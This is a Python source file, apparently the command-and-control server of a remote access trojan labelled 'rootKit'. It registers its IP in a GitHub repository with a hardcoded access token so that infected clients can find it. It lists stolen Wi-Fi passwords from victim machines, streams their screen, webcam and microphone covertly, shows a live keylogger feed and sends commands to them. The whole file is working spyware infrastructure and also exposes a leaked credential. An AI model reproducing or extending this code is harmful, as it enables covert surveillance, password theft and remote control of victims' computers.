import socket, os, threading, requests, re, sys, keyboard
from os import name
from vidstream import StreamingServer
from pyaudio import PyAudio, paInt16
from time import sleep
from numpy import array
from math import *
from fct import clear as clearWindow
from colored import fg, bg, attr
from iteration_utilities import duplicates
from github import Github
from subprocess import call as supCall
from math import ceil
def getSelfIp(temp=-1):
    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
def connected():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("www.google.com", 80))
        return True
    except Exception as e:
        print(e)
        return False
if getSelfIp() not in("192.168.249.97") and connected():
    # First create a Github instance:
    g = Github("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")
    # Then play with your Github objects:
    # for repo in g.get_user().get_repos():
    #     print(repo.name)
    repo = g.get_repo("N0SAFE/kit-local")
    try:
        contents = repo.get_contents("rootKit/ip")
        repo.delete_file(contents.path, "remove ip", contents.sha)
    except:
        pass
    repo.create_file("rootKit/ip", "create", getSelfIp())
    with open('ip.txt', "w") as file:
        file.write(getSelfIp())
else:
    print("vous n'étes pas connecter")
    exit()

githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
reset, sendAndReceive, mythreads, threadConnected, listenIp = attr(0), [], [], [], False

class Microphone(threading.Thread):
    def __init__(self, ip, port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.close = False
        self.RUN = False
    def run(self):
        self.RUN = True
        BREAK = False
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.ip, self.port))
                break
            except:
                if self.close:
                    break
                pass
        if not self.close:
            FORMAT, CHANNELS, RATE, CHUNK = paInt16, 1, 44100, 4096
            audio = PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
            try:
                while True:
                    data = self.s.recv(CHUNK)
                    try:
                        if data.decode() == "error":
                            break
                    except:
                        pass
                    stream.write(data)
            except:
                pass
            self.s.close()
            stream.close()
            audio.terminate()
        self.RUN = False
    def stopServer(self):
        if self.RUN == True:
            self.s.close()
            self.close = True
    def isRunning(self):
        return self.RUN

class myThread(threading.Thread):
    def __init__(self,ip,port, ID, con, init): 
        threading.Thread.__init__(self)
        INIT = {}
        for i in range(0, len(init), 2):
            INIT[init[i]] = init[i+1]
        # print(INIT)
        self.micIsAlive = False
        self.screen = False
        self.camera = False
        self.linked = False
        self.wifi = INIT['wifi']
        self.name = INIT['name']
        self.macAddress = INIT['mac']
        self.con = con
        self.ID = ID
        self.ip = ip 
        self.port = port 
        self.Stop = False
        # print (f"[+] Nouveau thread démarré pour {ip}:{str(port)}, {name}")
    def run(self):
        global ip
        loop = 5
        while True:
            if self.Stop:
                break
            if loop == 10:
                try:
                    getAll.getID().index(self.ID)
                except:
                    break
                try:
                    self.con.sendall("9".encode())
                except:
                    # print("error")
                    break
                loop = 0
            sleep(0.5)
            try:
                getAll.getID().index(self.ID)
            except:
                break
            loop+=1
        try:
            ip.pop(ip.index(self.getFullIp()))
        except:
            pass
        try:
            mythreads.pop(mythreads.index(self.currentthread))
        except:
            pass
        exit()
    def writeWifi(self):
        for line in self.wifi.split('-_-'):
            try:
                print(f"le mdp de {line.split(';-;')[0]} est {line.split(';-;')[1]}")
            except:
                pass
    def currentThread(self, thread):
        self.currentthread = thread
    def send(self, data):
        data.replace("9", "8+1")
        self.con.sendall(data.encode())
        sleep(0.05)
    def stop(self):
        self.Stop = True
    def getCon(self):
        return self.con
    def getId(self):
        return self.ID
    def getPort(self):
        return self.port
    def getIp(self):
        return self.ip
    def getCurrentThread(self):
        return self.currentthread
    def getName(self):
        return self.name
    def getFullIp(self):
        return f"{self.ip}:{self.port}"
    def testIfSameIp(self, IP):
        IP = IP.split(':')
        if len(IP) > 1:
            return self.ip == IP[0] and str(self.port) == IP[1]
        return self.ip == IP[0]
    def isLink(self):
        return self.linked
    def link(self):
        self.linked = True
    def unlink(self):
        self.linked = False
    def screenStart(self, port):
        if not self.screen:
            self.screenPort = port
            self.scrn = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.scrn.start_server)
            t.daemon=True
            t.start()
        self.screen = True
    def screenStop(self):
        self.scrn.stop_server()
        self.screen = False
    def getPortScreen(self):
        return self.screenPort
    def screenIsAlive(self):
        return self.screen
    def cameraStart(self, port):
        if not self.camera:
            self.cameraPort = port
            self.cam = (StreamingServer(requests.get(f"{githubUrl}ip").text.replace("\n", ""), port))
            t = threading.Thread(target=self.cam.start_server)
            t.daemon=True
            t.start()
        self.camera = True
    def cameraStop(self):
        self.cam.stop_server()
        self.camera = False
    def getPortCamera(self):
        return self.cameraPort
    def cameraIsAlive(self):
        return self.camera
    def micStart(self, port):
        try:
            self.micIsAlive = self.mic.isRunning()
            # print(self.micIsAlive)
        except:
            pass
        if not self.micIsAlive:
            self.micPort = port
            self.mic = Microphone(self.ip, port)
            self.mic.daemon = True
            self.mic.start()
    def micLives(self):
        return self.micIsAlive
    def micStop(self):
        self.mic.stopServer()
    def getPortMic(self):
        return self.micPort
    

class getAll():
    def getID(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getId())
        return ret
    def getCon(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getCurrentThread())
        return ret
    def getName(MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            ret.append(thread.getName())
        return ret
    def getAllByName(name, MYTHREADS=mythreads):
        ret = []
        for thread in MYTHREADS:
            if thread.getName() == name:
                ret.append(thread.getName())
                ret.append(thread.getFullIp())
        return ret
class getConnected():
    def getID():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getId())
        return ret
    def getCon():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCon())
        return ret
    def getCurrentThreads():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getCurrentThread())
        return ret
    def getName():
        ret = []
        for thread in threadConnected:
            ret.append(thread.getName())
        return ret

# Programme du serveur TCP

port, ipHost = 9999, getSelfIp()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
s.bind((ipHost, port))

def MainThread():
    global mythreads
    ID=0
    mainThread = threading.currentThread()
    # print(mainThread)
    while getattr(mainThread, "do_run", True):
        try:
            ID+=1
            s.settimeout(1)
            s.listen(1) 
            # print("Serveur: en attente de connexions des clients TCP ...")
            (con, (ip,port)) = s.accept()
            OK = False
            init = con.recv(4096*4).decode()
            mythread = myThread(ip, port, ID, con, init.split(':'))
            mythread.currentThread(mythread)
            mythreads.append(mythread)
            mythread.daemon = True
            mythread.start()
        except:
            pass

mainThread = threading.Thread(target=MainThread)
mainThread.daemon = True
mainThread.start()

def TrueFalseColor(bool):
    if bool:
        return fg(2)+str(bool)+reset
    return fg(1)+str(bool)+reset
def getByGithub(url):
        return requests.get(f"{url}").text
def terminal_size(columns=None, lines=None):
    if columns or lines:
        if name == 'posix':
            if columns:
                supCall(['stty', 'cols', str(columns)], shell=True)
            if lines:
                supCall(['stty', 'rows', str(lines)], shell=True)
        else:
            if columns:
                supCall(['mode', 'con:', 'cols={}'.format(columns)], shell=True)
            if lines:
                supCall(['mode', 'con:', 'lines={}'.format(lines)], shell=True)
    return (((("".join("".join(str(os.get_terminal_size()).split("(")[1]).split(")"))).replace("=", "")).replace("columns", "")).replace("lines", "").split(","))
def writeMiddle(data):
    return f"{int(ceil(int(terminal_size()[0])/2)-ceil(len(stopSpaceError(data))/2))*' '+stopSpaceError(data)}"
def writeFloat(left="", right="", leftLen=None, rightLen=None):
    if not leftLen:
        leftLen = len(left)
    if not rightLen:
        rightLen = len(right)
    return f"{left}{(int(terminal_size()[0])-leftLen-rightLen)*' '}{right}"
def initHelp(file):
    help = {}
    with open(file, 'r') as file:
        for sep in file.read().split('__//__'):
            first = True
            stop, sort = True, ''
            for line in sep.split('\n'):
                if line and stop:
                    temp, stop = stopSpaceError(line), False
                if not stop:
                    if first:
                        sort += f"{fg(40)}{attr(1)}{writeMiddle(line)}{reset}\n"
                        first = False
                    else:
                        sort += writeMiddle(line)+'\n'
            help[temp] = sort
    return help
def HELP(nameDict=None):
    if nameDict:
        return initHelp('help.txt')[nameDict]
    return initHelp('help.txt')
def send(data, THREAD=None):
    global addvar, run
    thread = getConnected.getCurrentThreads()
    if not THREAD:
        THREAD=thread
    if Send != False:
        for thread in THREAD:
            try:
                if data.split()[0] in ("screen"):
                    if thread.screenIsAlive():
                        thread.send(f"screen {thread.getPortScreen()}")
                elif data.split()[0] in ("camera"):
                    print(thread.cameraIsAlive())
                    if thread.cameraIsAlive():
                        thread.send(f"camera {thread.getPortCamera()}")
                elif data.split()[0] in ("microphone"):
                    # print(thread.micLives())
                    if not thread.micLives():
                        # print(f'starting mic on {thread.getPortMic()} {thread.getIp()}')
                        thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                    else:
                        micStop(reload=True)
                        thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                else:
                    thread.send(data)
                # print(f'send {data} to {thread.getCon()}')
                if data in ("die", "left"):
                    thread.stop()
            except:
                print("connexion lost")
                run = False
    else:
        addvar += data+"µ"

def threadingSendAndReceive(dataToSend, ip, port, thread):
    rest = True
    try:
        thread.send(dataToSend)
    except Exception as e:
        print(f'connexion lost on {ip}:{port}')
        rest=False
    if rest:
        try:
            thread.getCon().settimeout(4)
            print(thread.getCon().recv(64000))
        except:
            print(f'no return in {ip}:{port}')
        
def runThreadingSendAndReceive(data):
    loop = 0
    # print(SocketCo)
    for thread in getConnected.getCurrentThreads():
        t = threading.Thread(target=threadingSendAndReceive, args=(data, thread.getIp(), thread.getPort(), thread,))
        sendAndReceive.append(t)
        t.daemon = True
        t.start()
        loop+=1
    sleep(5)

def testIfIpTrue(data, total=False):
    if total == False:
        for i in range(len(data.split('.'))):
            if int(data.split('.')[i]) > 255:
                return False
        return True
    if total != False:
        return testIfIpTrue(data) == True and len(data.split('.')) == 4
def stopSpaceError(data):
    return " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
def clear():
    clearWindow()

def restart(timeout=2):
    global mainThread
    # print(mainThread)
    # print(mythreads)
    mainThread.do_run = False
    for thread in getAll.getCurrentThreads():
        try:
            thread.send('left')
        except:
            pass
    sleep(timeout)
    mainThread = threading.Thread(target=MainThread)
    mainThread.daemon = True
    mainThread.start()
    clear()

def testEmptyLine(nameFile):
    numberLine, file, ligne, numbsup, lignesup = (len((open(nameFile,'r')).readlines())), (open(nameFile, 'r')), 0, 0, []
    for i in range(numberLine):
        readln, ligne = file.readline(), ligne + 1 
        if readln == "\n":
            lignesup.append(ligne)
            numbsup += 1
    lignesup.sort(reverse=True)
    for i in range(numbsup):
        supLine(nameFile, lignesup[i])
    file.close()

def supLine(filename, line_to_delete):
    initial_line = 1
    file_lines = {}
    with open(filename) as f:
        content = f.readlines()
    for line in content:
        file_lines[initial_line] = line.strip()
        initial_line += 1
    f = open(filename, "w")
    for line_number, line_content in file_lines.items():
        if line_number != line_to_delete:
            f.write('{}\n'.format(line_content))
        else:
            print(f'{line_content} has been successfuly delete')
    f.close()
    
def printFileCmd():
    filename = "cmd.txt"
    testEmptyLine(filename)
    with open(filename) as fp:
        sort = fp.read()
        if sort:
            sort = sort.split('\n')
            loop = 0
            for line in sort:
                if line:
                    loop += 1
                    print(f'line {loop}: {line}')
        else:
            print("no cmd register")
            print("to register a cmd write register (and enter your cmd here)")

def inputcolor(color=255, attribut=None, content="", preset=None):
    numPreset=preset
    preset=[[127,1,">"]]
    if numPreset != None and numPreset > 0:
        numPreset-=1
        ret = inputcolor(color=preset[numPreset][0], attribut=preset[numPreset][1], content=preset[numPreset][2])
        return ret
    else:
        return input(fg(color)+attr(attribut)+content+reset)

def retLineCmd(filename, numberline):
    with open(filename) as fp:
       line, cnt = fp.readline(), 1
       while line:
            if cnt == numberline:
                return("{}".format(line.strip()))
            line = fp.readline()
            cnt += 1
def printSocketCo():
    mainThread = threading.currentThread()
    while getattr(mainThread, "do_run", True):
        clear()
        print(writeFloat('pour sortir appuyer sur entrer', 'github: '+TrueFalseColor(getSelfIp()==getByGithub(f"{githubUrl}ip").replace("\n", "")), rightLen = len('github: '+str(getSelfIp()==getByGithub(f"{githubUrl}ip").replace("\n", "")))))
        print()
        print()
        command('list')
        sleep(2)
def testin(data, *cmd):
    for command in cmd:
        if data == command:
            return True
    return False
def displayContinueSocket(stop):
    DICT = {}
    for thread in getConnected.getCurrentThreads():
        DICT[thread.getCon()] = [thread.getName(), ""]
    actuel = ""
    pause = False
    while True:
        for con in getConnected.getCon():
            try:
                if not pause:
                    con.settimeout(0.01)
                    receive = con.recv(5).decode()
                    if receive:
                        delete = 0
                        if receive == "x/332":
                            DICT[con] = [DICT[con][0], DICT[con][1][:-1]]
                            delete = 1
                        elif receive == "w/145":
                            DICT[con] = [DICT[con][0], ""]
                            print()
                        else:
                            DICT[con] = [DICT[con][0], DICT[con][1]+receive]
                        if DICT[con][0] != actuel and actuel != "":
                            DICT[con] = [DICT[con][0], DICT[con][1]+"\n"]
                        sys.stdout.flush() # Pour raffraichir l'affichage
                        sys.stdout.write(chr(13)) # Retour chariot
                        sys.stdout.write(' '*(len(DICT[con][0]+": "+DICT[con][1])+delete)) # Efface la ligne. Comprendre 100 > 99 = 1 caractere de moins
                        sys.stdout.write(chr(13))
                        sys.stdout.write(DICT[con][0]+": "+DICT[con][1])
                        actuel = DICT[con][0]
            except Exception as e:
                pass
        if stop():
            break
    print()
        
        
# ! main
def command(commandToExecute):
    commandToExecute = stopSpaceError(commandToExecute)
    commandToExecuteList = commandToExecute.split()
    global ipToConnect, ip, run, reloading, progrun, affiche, listenIp, runCommand
    ip, error = [], False
    try:
        if testin(commandToExecuteList[0], "connect", "connexion", "connecter", "co"):
            if len(commandToExecuteList) > 1:
                if testin(commandToExecuteList[1], 'all'):
                    for thread in mythreads:
                        ip.append(f"{thread.getIp()}:{thread.getPort()}")
                        affiche.append(f"{thread.getIp()}:{thread.getPort()}")
                else:
                    commandToExecuteList.pop(0)
                    for IP in commandToExecuteList:
                        listName = getAll.getAllByName(IP)
                        if listName:
                            ip.append(listName[1])
                            affiche.append(listName[0])
                        else:
                            OK = True
                            ipsplit = IP.split(":")
                            if len(ipsplit) > 1:
                                for i in IP.split(":"):
                                    i = "".join(i.split("."))
                                    if not i.isdigit():
                                        OK = False
                                if OK:
                                    ip.append(IP)
                                    affiche.append(IP)
                                else:
                                    error = True
                            else:
                                if "".join(IP.split(".")).isdigit():
                                    ip.append(IP)
                                    affiche.append(IP)
                                else:
                                    error = True
            else:
                print("[ERROR]: no ip requested")
                command(inputcolor(preset=1))
            if error:
                print("ip error")
                run = False
        elif testin(commandToExecute, 'ip'):
            # afficher l'ip du server
            print(ipHost)
        elif testin(commandToExecute, "stop"):
            # stop le programme
            global progrun
            progrun = False
        elif testin(commandToExecute, "wifi"):
            # affiche les wifi et mdp des machine connecter
            for thread in getAll.getCurrentThreads():
                print(f'list wifi de {thread.getName()}')
                print()
                thread.writeWifi()
        elif testin(commandToExecute, "listenIp", "listenip", 'listen'):
            t = threading.Thread(target=printSocketCo)
            t.start()
            input()
            t.do_run = False
            clear()
        elif testin(commandToExecute, "help", "aide"):
            try:
                print(fg(40)+attr(1)+int(terminal_size()[0])*"_"+"\n"+reset+HELP('local command'))
            except:
                print('aucune aide ici...')
            command(inputcolor(preset=1))
        elif testin(commandToExecute, 'reloadCo', 'restartCo'):
            restart()
        elif testin(commandToExecute, 'stopCo'):
            for thread in getAll.getCurrentThreads():
                try:
                    thread.send('die')
                    mythreads.pop(mythreads.index(thread))
                except Exception as e:
                    print(e)
                    pass
        elif testin(commandToExecute, 'setting', 'param', 'parameter'):
            4
        elif testin(commandToExecute, "clear", "cleared", "cls", "restart"):
            print('cleared')
            clear()
        elif testin(commandToExecute, "reload", "reloading"):
            os.system(os.path.basename(__file__))
            run, reloading, progrun=False, True, False
        elif testin(commandToExecute, "list"):
            OK = False
            for thread in getAll.getCurrentThreads():
                OK = True
                print(f"{fg(40)}{attr(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
            if not OK:
                print(f'{fg(1)}{attr(1)}aucune connexion active...{reset}')
        elif testin(commandToExecute, "command"):
            runCommand = True
            registerCmdAcces("help")
            while runCommand == True:
                registerCmdAcces(inputcolor(preset=1))
            clear()
        else:
            print("Error")
            command(inputcolor(preset=1))
    except Exception as e:
        print(e)
        command(inputcolor(preset=1))

def registerCmdAcces(data):
    global runCommand
    data = stopSpaceError(data)
    dataList = data.split()
    try:
        if testin(dataList[0], "register", "enregistre"):
            customcmd = open("cmd.txt", "a")
            temp = "\n"+" ".join(dataList[1:len(dataList)])
            customcmd.write(temp)
            customcmd.close()
            print('the command '+temp.replace('\n', '')+' as been create successfuly')
        elif testin(data, "help", "clear", "cls"):
            clear()
            print(fg(40)+attr(1)+writeMiddle("your in the cmd space")+reset)
            print()
            try:
                print(HELP('custom cmd command'))
            except:
                print('aucune aide ici...')
        elif testin(data, "cmdList", "commandlist", "listcmd", "listcommand", "list"):
            try:
                printFileCmd()
            except:
                print("no cmd register")
                print("to register a cmd write register (and enter your cmd here)")
        elif testin(data, "back"):
            runCommand = False
        elif testin(dataList[0], "sup", "del"):
            if len(dataList) > 2 and dataList[2].isdigit() == True:
                dataList[2] = int(dataList[2])
                supLine("cmd.txt", dataList[2])
            elif len(dataList) > 1 and dataList[1].isdigit() == True:
                dataList[1] = int(dataList[1])
                supLine("cmd.txt", dataList[1])
            else:
                print("no int write")
        else:
            print("Error")
    except:
        pass

def sendData(data, RETURN=False):
    global run, Send, mythreads, runCommand, pause
    datalist = data.split()
    numCmd = data.split("µ+µ")
    if len(numCmd) > 1:
        data = "fastcontrol "+data
        datalist = data.split()
    OK = True
    if not data:
        OK = False
    if OK:
        try:
            if testin(data, "die", "kill"):
                try:
                    send("die")
                except:
                    pass
                run = False
            elif testin(data, 'wifi', 'wf'):
                for thread in getConnected.getCurrentThreads():
                    print(f'list wifi de {thread.getName()}')
                    print()
                    thread.writeWifi()
            elif testin(data, "list", 'lst'):
                OK = False
                ret = []
                for thread in getConnected.getCurrentThreads():
                    if RETURN:
                        ret.append(f"{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                    else:
                        print(f"{fg(40)}{attr(1)}{thread.getName()}  --->  {thread.getFullIp()}{reset}")
                    OK = True
                if not OK:
                    print(f'{fg(1)}{attr(1)}aucune connexion active...{reset}')
                if RETURN:
                    return ret
            elif testin(data, "help", "aide"):
                try:
                    print(fg(40)+attr(1)+int(terminal_size()[0])*"_"+"\n"+reset+HELP('sending command'))
                except:
                    print('aucune aide ici...')
            elif testin(datalist[0], "severalcmd"):
                send(data)
            elif testin(datalist[0], "wallpaper"):
                send(data)
            elif testin(data, "command"):
                runCommand = True
                clear()
                print(fg(40)+attr(1)+"your in the cmd space"+reset)
                registerCmdAcces("help")
                while runCommand == True:
                    registerCmdAcces(inputcolor(preset=1))
                    print('test')
                    print(runCommand)
                clear()
            elif testin(datalist[0], "command") and testin(datalist[1], "list") or testin(data, "cmdlist", "listcmd"):
                try:
                    printFileCmd()
                except:
                    print("no cmd register")
                    print("to register a cmd write register (and enter your cmd here)")
            elif testin(datalist[0], "command"):
                if len(datalist) > 2 and datalist[2].isdigit() == True:
                    datalist[2] = int(datalist[2])
                    sendData(retLineCmd("cmd.txt", datalist[2]))
                elif len(datalist) > 1 and datalist[1].isdigit() == True:
                    datalist[1] = int(datalist[1])
                    sendData(retLineCmd("cmd.txt", datalist[1]))
                else:
                    if data == 'command':
                        runCommand = True
                        registerCmdAcces("help")
                        while runCommand == True:
                            registerCmdAcces(inputcolor(preset=1))
                        clear()
                    else:
                        print("no int write")
            elif testin(data, "left", "quit", "restart", "stop"):
                try:
                    send("left")
                except:
                    pass
                run = False
            elif testin(data, "screenStart", "screenstart", "screenRun", "screenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
                send("screen")
            elif testin(data, "screenStop", "screenstop", "Stopscreen", "stopscreen"):
                screenStop(reload=True)
            elif testin(data, "cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
                send("camera")
            elif testin(data, "cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
                cameraStop(reload=True)
            elif testin(data, "startmic", "micstart"):
                send("microphone")
            elif testin(data, 'micStop'):
                micStop(reload=True)
            elif testin(data, "spy"):
                sendData("startmic")
                sleep(0.5)
                sendData("cameraStart")
                sleep(0.5)
                sendData("screenStart")
            elif testin(data, 'spyStop'):
                sendData("micStop")
                sleep(0.5)
                sendData("cameraStop")
                sleep(0.5)
                sendData("screenStop")
            elif testin(datalist[0], "fasttap", "fastTap", "tapfast", "tapFast"):
                datalist.pop(0)
                print(datalist)
                data = "fast "+" ".join(datalist)
                send(data)
            elif testin(data, "cls", "clear"):
                clear()
            elif testin(datalist[0], "time", "sleep"):
                if not datalist[1]:
                    datalist.append(1)
                sleep(int(datalist[1]))
            elif testin(datalist[0], "fastcontrol"):
                Send = False
                datalist.pop(0)
                datalist = " ".join(datalist)
                datalist = datalist.split("µ")
                for i in range(len(datalist)):
                    datalist[i] = stopSpaceError(datalist[i])
                    sendData(datalist[i])
                Send = True
                send("severalcontrol "+addvar)
                # while data != "ok":
                #     SocketCo.settimeout(3)
                #     data = (SocketCo.recv(ceil(32768))).decode()
                #     print(data)
            elif testin(data, "listenKeylogger"):
                send("listenKeyloggerTrue")
                stop_display_continue_socket = False
                threadingDisplayAll = threading.Thread(target=displayContinueSocket, args =(lambda : stop_display_continue_socket, ))
                threadingDisplayAll.start()
                print("press escape to quit")
                while True:
                    try:
                        if keyboard.is_pressed("escape"):
                            break
                        elif keyboard.is_pressed("ctrl+p"):
                            print("pause")
                            if pause:
                                pause = False
                            else:
                                pause = True
                    except:
                        pass
                send("listenKeyloggerFalse")
                stop_display_continue_socket = True
                threadingDisplayAll.join()
            else:
                runThreadingSendAndReceive(data)
        except Exception as e:
            print(e)
            pass

def screenStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.screenStop()
        except:
            pass
        if reload:
            try:
                thread.screenStart(thread.getPortScreen())
            except:
                pass

def cameraStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.cameraStop()
        except:
            pass
        if reload:
            try:
                thread.cameraStart(thread.getPortCamera())
            except:
                pass

def micStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.micStop()
            # print('mic stop')
        except:
            pass
        sleep(0.2)
        if reload:
            try:
                thread.micStart(thread.getPortMic())
            except:
                pass
            # print('mic start')

progrun = True
while progrun:
    ip, Send, run = [], True, False
    affiche = []
    command(inputcolor(preset=1))
    if ip:
        while list(duplicates(ip)):
            ip.pop(ip.index(list(duplicates(ip))[0]))
        loopScreenCam = 0
        threadConnected = []
        afficheIpPortConnected = []
        for ipToCo in ip:
            loop = 0
            for thread in mythreads:
                if thread.testIfSameIp(ipToCo):
                    try:
                        threadConnected.index(thread)
                        OK = False
                    except:
                        OK = True
                    if OK:
                        portScreenCamMic = 22224+loopScreenCam
                        threadConnected.append(thread)
                        afficheIpPortConnected.append(f"{thread.getIp()}:{thread.getPort()}")
                        thread.screenStart(portScreenCamMic)
                        thread.cameraStart(portScreenCamMic+1)
                        thread.micStart(portScreenCamMic+2)
                        run = True
                        break
                loop += 1
            loopScreenCam += 3
            if threadConnected:
                server = True
    while run == True and progrun == True:
        if ip:
            addvar = ""
            listIp = []
            error = False
            while list(duplicates(affiche)):
                affiche.pop(affiche.index(list(duplicates(affiche))[0]))
            for line in affiche:
                for connexion in sendData('list', RETURN=True):
                    if connexion.split("--->  ")[1] in listIp:
                        try:
                            affiche.pop(affiche.index(connexion.split("  --->  ")[1]))
                        except:
                            try:
                                affiche.pop(affiche.index(connexion.split("  --->  ")[0]))
                            except:
                                affiche.pop(affiche.index(connexion.split("  --->  ")[1].split(':')[0]))
                        error = True
                    listIp = connexion.split("--->  ")[1]
            if error:
                print('plusieur connexion sur le meme ip/port')
            affichage = ", ".join(affiche)
            if list(duplicates(affiche)):
                affichage = ", ".join(afficheIpPortConnected)
            sendData(input(fg(127)+attr(1)+affichage+">"+reset))
        else:
            run = False
            print('tout les socket sont fermer')
    try:
        if server == True:
            screenStop(threadConnected)
            cameraStop(threadConnected)
            micStop(threadConnected)
            server = False
    except:
        pass

mainThread.do_run = False
exit()
